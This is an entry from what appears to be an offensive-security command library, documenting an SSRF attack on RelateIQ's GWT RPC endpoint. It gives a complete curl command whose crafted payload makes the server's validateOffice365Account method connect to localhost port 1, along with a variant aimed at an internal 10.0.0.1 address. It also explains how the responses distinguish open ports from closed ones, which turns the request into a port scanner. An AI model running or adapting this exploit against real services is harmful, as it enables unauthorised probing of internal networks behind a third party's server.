---
id: cmd-relateiq-gwt-ssrf
data: >-
  curl -X POST https://app.relateiq.com/app/GWT.rpc -H "Content-Type:
  text/x-gwt-rpc; charset=utf-8" -H "X-GWT-Permutation:
  95882AF82F06F7F3497A1C7BDD950153" -H "X-GWT-Module-Base:
  https://app.relateiq.com/app/" -H "Referer: https://app.relateiq.com/" -d
  '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
tags:
  - ssrf
  - gwt
  - rpc
type: command
output: >-
  For open ports: HTTP 504 Gateway Timeout or 'The underlying connection was
  closed: An unexpected error occurred on a send'; for closed ports: 'Unable to
  connect to the remote server'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.600Z'
verified: false
validated: true
submitted: true
---
# gwt-rpc-ssrf-test

## Command

```bash
curl -X POST https://app.relateiq.com/app/GWT.rpc \
  -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
  -H "X-GWT-Permutation: 95882AF82F06F7F3497A1C7BDD950153" \
  -H "X-GWT-Module-Base: https://app.relateiq.com/app/" \
  -H "Referer: https://app.relateiq.com/" \
  -d '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
```

## Description

Sends a GWT RPC request to RelateIQ's validateOffice365Account method with a custom URL targeting localhost port 1, exploiting SSRF for initial port probing during registration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: ..."` | Sets GWT RPC content type | Yes |
| `-H "X-GWT-Permutation: ..."` | GWT module permutation hash | Yes |
| `-H "X-GWT-Module-Base: ..."` | Base URL for GWT module | Yes |
| `-d '...' ` | Payload with email (123@123.com), password (123), custom URL (https://127.0.0.1:1), and method | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://app.relateiq.com/app/GWT.rpc -H "Content-Type: text/x-gwt-rpc; charset=utf-8" -d '...'  # As above for port 1
```

### Advanced Usage

```bash
# Modify URL for different port/IP
curl ... -d '...|https://10.0.0.1:80|...'
```

## Expected Output

Description of what output to expect when the command runs successfully.

For open ports: HTTP 504 Gateway Timeout or connection error messages indicating server-side attempt succeeded but timed out. For closed ports: Explicit 'Unable to connect to the remote server' from the backend.

## Related

- [[Related Procedure|procedures/Craft-GWT-RPC-Request-for-SSRF-Test]]
- [[Related Procedure|procedures/Perform-Port-Scanning-via-SSRF]]
